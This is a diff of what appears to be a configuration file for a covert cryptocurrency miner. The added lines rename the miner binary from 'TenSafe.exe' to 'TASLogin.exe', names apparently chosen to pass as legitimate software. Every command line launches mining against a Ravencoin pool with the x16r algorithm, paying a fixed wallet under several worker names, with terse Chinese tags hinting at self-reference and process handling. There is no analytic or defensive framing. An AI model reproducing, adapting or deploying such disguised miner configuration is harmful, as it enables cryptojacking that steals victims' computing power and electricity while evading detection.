@@ -15,17 +15,17 @@ Y3X--MMMMMMM.EXE--Y3X
 Y4X--MMMMMMM.EXE--Y4X
 Y5X--MMMMMMM.EXE--Y5X
 ------------------------------------------------------------------------------------------------------------------------------------
-A1A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV13@pplns -i 13 -p x--A1A
-A2A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV15@pplns -i 14 -p x--A2A
-A3A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV16@pplns -i 14 -p x--A3A
-A4A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1013@pplns -i 13 -p x--A4A
-A5A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1014@pplns -i 14 -p x--A5A
-A6A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1015@pplns -i 14 -p x--A6A
-A7A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.cf12@pplns -i 12 -p x--A7A
+A1A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV13@pplns -i 13 -p x--A1A
+A2A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV15@pplns -i 14 -p x--A2A
+A3A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV16@pplns -i 14 -p x--A3A
+A4A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1013@pplns -i 13 -p x--A4A
+A5A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1014@pplns -i 14 -p x--A5A
+A6A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1015@pplns -i 14 -p x--A6A
+A7A--\TASLogin.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.cf12@pplns -i 12 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
-A0A--\TenSafe.exe--A0A
-A8A--Ten1Safe.exe--A8A---自身
+A0A--\TASLogin.exe--A0A
+A8A--TASLogin.exe--A8A---自身
 ------------------------------------------------------------------------------------------------------------------------------------
 B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取程
 B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---
